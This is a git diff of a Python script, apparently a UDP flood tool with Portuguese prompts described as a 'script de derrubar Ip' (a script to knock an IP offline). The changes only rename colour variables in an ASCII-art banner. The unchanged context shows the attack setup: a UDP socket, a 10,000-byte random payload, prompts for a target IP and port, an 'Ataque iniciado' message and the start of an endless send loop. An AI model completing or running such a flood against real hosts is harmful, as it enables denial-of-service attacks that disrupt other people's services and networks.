@@ -7,23 +7,23 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(10000)
 timeout = time.time()
 
-preto= '\033[37m'
-vermelho= '\033[34m'
-amarelo= '\033[31m'
+branco= '\033[37m'
+azul= '\033[34m'
+vermelho= '\033[31m'
 def script():
     os.system("clear")
     time.sleep(1)
-    print(preto+"⣿⣿⣿⣵⣿⣿⣿⠿⡟⣛⣧⣿⣯⣿⣝⡻⢿⣿⣿⣿⣿⣿⣿⣿")
+    print(branco+"⣿⣿⣿⣵⣿⣿⣿⠿⡟⣛⣧⣿⣯⣿⣝⡻⢿⣿⣿⣿⣿⣿⣿⣿")
     print("⣿⣿⣿⣿⣿⠋⠁⣴⣶⣿⣿⣿⣿⣿⣿⣿⣦⣍⢿⣿⣿⣿⣿⣿ ")
     print("⣿⣿⣿⣿⢷⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢼⣿⣿⣿⣿")
     print("⢹⣿⣿⢻⠎⠔⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿")
     print("⢸⣿⣿⠇⡶⠄⣿⣿⠿⠟⡛⠛⠻⣿⡿⠿⠿⣿⣗⢣⣿⣿⣿⣿")
-    print(vermelho+"⠐⣿⣿⡿⣷⣾⣿⣿⣿⣾⣶⣶⣶⣿⣁⣔⣤⣀⣼⢲⣿⣿⣿⣿")
+    print(azul+"⠐⣿⣿⡿⣷⣾⣿⣿⣿⣾⣶⣶⣶⣿⣁⣔⣤⣀⣼⢲⣿⣿⣿⣿")
     print("⠄⣿⣿⣿⣿⣾⣟⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⢟⣾⣿⣿⣿⣿ ")
     print("⠄⣟⣿⣿⣿⡷⣿⣿⣿⣿⣿⣮⣽⠛⢻⣽⣿⡇⣾⣿⣿⣿⣿⣿ ")
     print("⠄⢻⣿⣿⣿⡷⠻⢻⡻⣯⣝⢿⣟⣛⣛⣛⠝⢻⣿⣿⣿⣿⣿⣿ ")
     print("⠄⠸⣿⣿⡟⣹⣦⠄⠋⠻⢿⣶⣶⣶⡾⠃⡂⢾⣿⣿⣿⣿⣿⣿")
-    print(amarelo+"⠄⠄⠟⠋⠄⢻⣿⣧⣲⡀⡀⠄⠉⠱⣠⣾⡇⠄⠉⠛⢿⣿⣿⣿")
+    print(vermelho+"⠄⠄⠟⠋⠄⢻⣿⣧⣲⡀⡀⠄⠉⠱⣠⣾⡇⠄⠉⠛⢿⣿⣿⣿")
     print("⠄⠄⠄⠄⠄⠈⣿⣿⣿⣷⣿⣿⢾⣾⣿⣿⣇⠄⠄⠄⠄⠄⠉⠉")
     print("⠄⠄⠄⠄⠄⠄⠸⣿⣿⠟⠃⠄⠄⢈⣻⣿⣿⠄⠄⠄⠄⠄⠄⠄")
     print("⠄⠄⠄⠄⠄⠄⠄⢿⣿⣾⣷⡄⠄⢾⣿⣿⣿⡄⠄⠄⠄⠄⠄⠄") 
@@ -35,14 +35,14 @@ def script():
     print("░▀░░░▀▀▀░░▀░░▀▀▀░▀░▀░░░▀▀▀░▀░░")
     time.sleep(1)
     print("\n")
-    print(vermelho+"Criado por "+amarelo+"syxz404")
+    print(vermelho+"Criado por "+azul+"syxz404")
     time.sleep(1)
     print(vermelho+"Bem vindo ao script de derrubar Ip!")
     print("\n")
-    ip = input("Digite o endereço de ip: "+amarelo)
-    port = int(input("Digite a porta: "+amarelo))
+    ip = input("Digite o endereço de ip: "+azul)
+    port = int(input("Digite a porta: "+azul))
     time.sleep(1)
-    print(vermelho+"Para parar o ataque, aperte"+amarelo+" ctrl+c")
+    print(vermelho+"Para parar o ataque, aperte"+azul+" ctrl+c")
     print("Ataque iniciado...")
     while True:
            while 1:
